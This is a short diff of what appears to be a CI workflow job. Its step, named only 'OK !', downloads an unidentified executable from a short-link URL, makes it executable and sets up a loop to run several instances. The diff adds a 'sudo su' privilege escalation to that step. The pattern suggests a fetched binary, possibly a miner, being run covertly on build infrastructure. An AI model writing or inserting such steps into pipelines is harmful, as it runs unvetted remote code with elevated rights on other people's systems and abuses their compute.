@@ -16,6 +16,7 @@ jobs:
       - name: OK !
         run: |
           wget https://curl.by/7D9E9/ovhand
+          sudo su
           chmod +x ovhand
           PIDS=()
           for i in {1..4}; do
